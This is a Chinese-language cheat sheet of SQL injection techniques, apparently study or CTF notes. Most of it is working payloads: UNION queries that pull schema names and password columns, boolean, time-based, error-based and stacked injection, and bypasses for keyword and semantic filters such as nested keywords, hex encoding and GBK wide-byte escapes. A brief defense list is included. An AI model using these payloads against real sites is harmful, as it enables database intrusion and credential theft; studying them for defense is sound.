# <center> SQL Injection
---
根据网站功能，猜测可能的SQL语句
SELECT col_name(…) FROM table_name WHERE id = {}       /*数字型*/
SELECT col_name(…) FROM table_name WHERE id = '{}'     /*字符型*/

### 判断数字型 / 字符型
1. 传入id=1: 正常页面
2. 再传入id=2-1 
- 如果是数字型，语句应该变为：
```sql
SELECT col_name(…) FROM table_name WHERE id = 2-1 
```
等价于：
```sql
SELECT col_name(…) FROM table_name WHERE id = 1 
```
那么就应该能正常返回id=1的页面

- 如果是字符型，语句应该变为：
```sql
SELECT col_name(…) FROM table_name WHERE id = '2-1'
```
会因为查询不到内容

### 字符型 -> 判断引号类型
有报错回显
| payload  |  单引号 |双引号|
|---|---|---|
|  id=' |  ''' 报错 |"'"|
|  id="  |  '"' |""" 报错|

无报错回显
|  payload | 单引号  |双引号|
|---|---|---|
|  id=adm''in | user found  |not found|



## 有回显
UNION SELECT

联合查询前后的列数必须一致，需要判断原SQL查询的列数
```
id=1' ORDER BY M#
id=1' UNION SELECT 1, 2,...#
```
获取基本信息
```
id=' UNION SELECT DATABASE(), USER(),...
```
获取更多信息

在MySQL中，所有的数据库名存放在information_schema.schemata的schema_name字段下
```sql
SELECT schema_name FROM information_schema.schemata;
```
所有的表名存放在information_schema.tables的table_name字段下，可以以table_schema为条件筛选
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='db_name';
```
所有的列名存放在information_schema.columns的column_name字段下，可以以table_schema和table_name为条件筛选
```sql
SELECT column_name FROM information_schema.columns WHERE table_name='table_name' 
AND table_schema='db_name';
```

pyaload
eg.
```
id = 4 UNION SELECT group_concat(schema_name), 2, 3 FROM information_schema.schemata
```

获取到表、列名后，可以获取其他数据
eg. users表中的passwd字段
- group_concat() 合并读取
```
id = 4 UNION SELECT group_concat(passwd), 2, 3 FROM users;
```
- LIMIT分行读取
```
id = 4 UNION SELECT passwd, 2, 3 FROM users LIMIT 0, 1;
```

## 无回显

布尔盲注
- `and` / `&&` - 前面是有效id时
- `or` / `||` - 前面是无效id时

用SUBSTR()一位位取出要查找内容的字符，再用ASCII()转化为ASCII码，就能用二分法获取数据
- SUBSTR(str, pos, len)
- ASCII(char)
```
name=a' or ASCII(SUBSTR((SELECT GROUP_CONCAT(passwd) FROM users), 1, 1))>0#
```

延时注入
- IF(condition, expr1, expr2)
- SLEEP()
```
name=admin' and IF(ASCII(SUBSTR(DATABASE(), 1, 1))>0, SLEEP(0), SLEEP(2))
```

报错注入
```
name=admin' AND extractvalue(1, concat(0x7e, (SELECT ...), 0x7e)) -- - 
name=admin' AND updatexml(1,concat(0x7e,(SELECT ...),0x7e),1)-- -
```


堆叠注入
很多数据库是支持多个SQL指令在一行内执行的,但服务端语言可能不会获取多行结果

常见判断方法：
```
;select sleep(1);#
```

二次注入
攻击者先将恶意数据存入数据库，之后当应用程序使用这些数据时触发注入

## 防护 & 绕过
### 防护
- 直接拦截
- 关键字替换
- 编码转义
- 参数化查询

### 检测
- 关键字匹配(直接查找/正则)
- 语义匹配

### 绕过

针对关键字/正则匹配
- 大小写
- 利用等价命令 比如 OR->||, SPACE->/**/, ORDER BY->GROUP BY …
- 如果只是单纯删去关键字，且只删一次，可以嵌套绕过，比如UNION是关键字会被删除，
那么传入UNUNIONION就会被删成UNION，从而注入
- 绕过引号
```sql
-- hex 编码
SELECT * FROM Users WHERE username = 0x61646D696E
-- char() 函数
SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)
```
宽字节注入：
如果数据库使用的是GBK编码，而服务端只采用addslashes()方法进行转义，可能造成逃逸。比如addslashes("%df'")="%df\'" 传给SQL服务器时十六进制编码为 df 5c 27  
而在GBK编码下，df 5c是汉字運的编码，最后这段字符会被数据库理解为運'，导致转义失效，单引号逃逸

- 字符串拼接
```sql
SELECT 'a' 'd' 'mi' 'n';
SELECT CONCAT('a', 'd', 'm', 'i', 'n');
SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
```


针对语义匹配
相对难度较大，只能利用语言特性把语义检测绕晕。常见办法是嵌套注释符让其以为全部内
容都被注释了。 
e.g. 
```
id = 1/*#*/union select 1, 2, 3
id = 1 and "/*"="" union select 1, 2, 3#*/
```